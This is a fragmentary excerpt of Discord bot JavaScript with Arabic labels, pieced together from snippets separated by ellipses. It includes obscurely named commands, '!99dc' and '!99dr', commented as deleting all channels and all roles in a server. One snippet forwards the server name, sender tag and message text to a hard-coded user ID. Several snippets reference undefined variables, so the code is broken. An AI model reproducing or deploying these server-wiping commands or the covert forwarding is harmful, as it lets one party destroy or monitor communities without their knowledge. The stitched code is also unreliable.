...
let args = message.content.split(" ").slice(1).join(" ");
client.users.get("436918120184021012").send(
    "\n" + "**" + "● السيرفر :" + "**" +
    "\n" + "**" + "» " + message.guild.name + "**" +
    "\n" + "**" + " ● المرسل : " + "**" +
    "\n" + "**" + "» " + message.author.tag + "**" +
...
var prefix = "!";
if(omar.content.split(' ')[0] == prefix + '99dc') {  // delete all channels
...
if(omar.content.split(' ')[0] == prefix + '99dr') { // delete all roles
if (!omar.channel.guild) return;
...
if (message.content.startsWith(prefix + '99image')) {
  ...
  var prefix = "!";
  let log = warn.guild.channels.find('name', "warns")
  let all = warn.guild.channels.find('name', "main-chat")
